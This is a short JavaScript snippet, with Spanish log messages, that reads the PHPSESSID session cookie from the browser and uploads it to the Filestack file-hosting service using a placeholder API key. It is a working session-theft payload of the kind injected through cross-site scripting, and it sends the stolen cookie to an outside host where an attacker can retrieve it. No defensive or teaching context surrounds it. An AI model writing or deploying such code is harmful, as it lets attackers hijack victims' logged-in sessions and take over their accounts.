var session = document.cookie.match(/PHPSESSID=(\w+)/);
var sessionSave = session ? session[1] : '';
var blob = new Blob([JSON.stringify(sessionSave)], { type: 'text/plain' });

var client = filestack.init('YOUR API KEY HERE');

client.upload(blob)
    .then(response => {
        var fileUrl = response.url;
        console.log('Archivo subido con éxito:', fileUrl);
    })
    .catch(error => {
        console.error('Error al subir el archivo:', error);
    });